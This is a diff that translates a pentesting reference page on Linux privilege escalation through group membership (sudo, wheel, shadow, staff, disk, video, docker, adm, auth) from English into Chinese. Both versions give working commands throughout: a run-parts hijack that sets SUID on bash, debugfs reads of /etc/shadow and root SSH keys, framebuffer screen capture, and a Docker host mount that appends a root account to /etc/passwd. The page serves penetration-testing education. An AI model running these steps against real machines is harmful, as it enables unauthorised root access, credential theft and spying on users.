@@ -1,13 +1,12 @@
-# Interesting Groups - Linux Privesc
+# 有趣的组 - Linux 权限提升
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Sudo/Admin Groups
+## Sudo/管理员组
 
-### **PE - Method 1**
+### **PE - 方法 1**
 
-**Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**有时**，**默认情况下（或因为某些软件需要它）**在 **/etc/sudoers** 文件中可以找到一些这些行：
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -15,48 +14,36 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+这意味着 **任何属于 sudo 或 admin 组的用户都可以以 sudo 身份执行任何操作**。
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+如果是这种情况，要 **成为 root，你只需执行**：
 ```
 sudo su
 ```
+### PE - 方法 2
 
-### PE - Method 2
-
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+查找所有 suid 二进制文件，并检查是否存在二进制文件 **Pkexec**：
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.\
-This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:
-
+如果你发现二进制文件 **pkexec 是一个 SUID 二进制文件**，并且你属于 **sudo** 或 **admin**，你可能可以使用 `pkexec` 以 sudo 身份执行二进制文件。\
+这是因为通常这些是 **polkit 策略** 中的组。该策略基本上识别哪些组可以使用 `pkexec`。使用以下命令检查：
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+在那里您将找到哪些组被允许执行 **pkexec**，并且在某些 Linux 发行版中，**sudo** 和 **admin** 组默认出现。
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.
-
-To **become root you can execute**:
-
+要 **成为 root，您可以执行**：
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+如果您尝试执行 **pkexec** 并且收到此 **错误**：
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
-
+**这不是因为你没有权限，而是因为你没有通过 GUI 连接**。对此问题有一个解决方法在这里: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要 **2 个不同的 ssh 会话**:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -67,39 +54,31 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
-
 ## Wheel Group
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+**有时**，**默认情况下**在 **/etc/sudoers** 文件中可以找到这一行：
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
+这意味着 **属于 wheel 组的任何用户都可以以 sudo 身份执行任何操作**。
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+如果是这样，要 **成为 root，你只需执行**：
 ```
 sudo su
 ```
-
 ## Shadow Group
 
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+来自 **group shadow** 的用户可以 **读取** **/etc/shadow** 文件：
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+所以，阅读文件并尝试**破解一些哈希**。
 
-So, read the file and try to **crack some hashes**.
+## 员工组
 
-## Staff Group
+**staff**: 允许用户在不需要根权限的情况下对系统进行本地修改（`/usr/local`）（请注意，`/usr/local/bin`中的可执行文件在任何用户的PATH变量中，并且它们可能会“覆盖”`/bin`和`/usr/bin`中同名的可执行文件）。与更相关于监控/安全的“adm”组进行比较。 [\[source\]](https://wiki.debian.org/SystemGroups)
 
-**staff**: Allows users to add local modifications to the system (`/usr/local`) without needing root privileges (note that executables in `/usr/local/bin` are in the PATH variable of any user, and they may "override" the executables in `/bin` and `/usr/bin` with the same name). Compare with group "adm", which is more related to monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)
-
-In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.
-
+在debian发行版中，`$PATH`变量显示`/usr/local/`将以最高优先级运行，无论您是否是特权用户。
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -107,11 +86,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
+如果我们可以劫持 `/usr/local` 中的一些程序，我们就可以轻松获得 root 权限。
 
-If we can hijack some programs in `/usr/local`, we can easy to get root.
-
-Hijack `run-parts` program is a way to easy to get root, because most of program will run a `run-parts` like (crontab, when ssh login).
-
+劫持 `run-parts` 程序是一种轻松获得 root 权限的方法，因为大多数程序会像 (crontab, 当 ssh 登录时) 一样运行 `run-parts`。
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -119,9 +96,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-
-or When a new ssh session login.
-
+或当一个新的ssh会话登录时。
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -134,9 +109,7 @@ $ pspy64
 2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
 2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
 ```
-
-**Exploit**
-
+**利用**
 ```bash
 # 0x1 Add a run-parts script in /usr/local/bin/
 $ vi /usr/local/bin/run-parts
@@ -155,13 +128,11 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
+## 磁盘组
 
-## Disk Group
+此权限几乎**等同于根访问**，因为您可以访问机器内部的所有数据。
 
-This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
-
-Files:`/dev/sd[a-z][1-9]`
-
+文件：`/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -170,57 +141,47 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+请注意，使用 debugfs 您也可以 **写入文件**。例如，要将 `/tmp/asd1.txt` 复制到 `/tmp/asd2.txt`，您可以执行：
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
+然而，如果你尝试**写入由 root 拥有的文件**（如 `/etc/shadow` 或 `/etc/passwd`），你将会遇到“**权限被拒绝**”错误。
 
-However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
+## 视频组
 
-## Video Group
-
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+使用命令 `w` 你可以找到**谁已登录系统**，它将显示如下输出：
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+**tty1** 表示用户 **yossi 正在物理登录** 到机器上的一个终端。
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+**video group** 有权限查看屏幕输出。基本上，你可以观察屏幕。为了做到这一点，你需要 **抓取当前屏幕上的图像** 的原始数据，并获取屏幕使用的分辨率。屏幕数据可以保存在 `/dev/fb0`，你可以在 `/sys/class/graphics/fb0/virtual_size` 找到该屏幕的分辨率。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the \*\*`screen.raw` \*\* file and select as file type **Raw image data**:
+要**打开** **原始图像**，您可以使用**GIMP**，选择**`screen.raw`**文件，并选择文件类型为**原始图像数据**：
 
 ![](<../../../images/image (463).png>)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):
+然后将宽度和高度修改为屏幕上使用的值，并检查不同的图像类型（并选择显示屏幕效果更好的那个）：
 
 ![](<../../../images/image (317).png>)
 
 ## Root Group
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+看起来默认情况下**root组的成员**可以访问**修改**一些**服务**配置文件或一些**库**文件或**其他有趣的东西**，这些都可以用来提升权限...
 
-**Check which files root members can modify**:
-
+**检查root成员可以修改哪些文件**：
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
+## Docker 组
 
-## Docker Group
-
-You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
-
+您可以**将主机的根文件系统挂载到实例的卷**，因此当实例启动时，它会立即加载一个 `chroot` 到该卷。这实际上使您在机器上获得了 root 权限。
 ```bash
 docker image #Get images from the docker service
 
@@ -232,33 +193,32 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-
-Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:
+最后，如果你不喜欢之前的任何建议，或者由于某种原因它们不起作用（docker api 防火墙？），你可以尝试**运行一个特权容器并从中逃逸**，如这里所述：
 
 {{#ref}}
 ../docker-security/
 {{#endref}}
 
-If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
+如果你对 docker socket 有写权限，请阅读[**这篇关于如何利用 docker socket 升级权限的文章**](../#writable-docker-socket)**。**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-## lxc/lxd Group
+## lxc/lxd 组
 
 {{#ref}}
 ./
 {{#endref}}
 
-## Adm Group
+## Adm 组
 
-Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.\
-Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.
+通常，**`adm`** 组的**成员**有权限**读取**位于 _/var/log/_ 中的日志文件。\
+因此，如果你已经攻陷了该组中的用户，你应该确实**查看日志**。
 
-## Auth group
+## Auth 组
 
-Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
-These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+在 OpenBSD 中，**auth** 组通常可以在 _**/etc/skey**_ 和 _**/var/db/yubikey**_ 文件夹中写入（如果它们被使用）。\
+这些权限可能会被以下漏洞利用，以**升级权限**到 root：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 {{#include ../../../banners/hacktricks-training.md}}
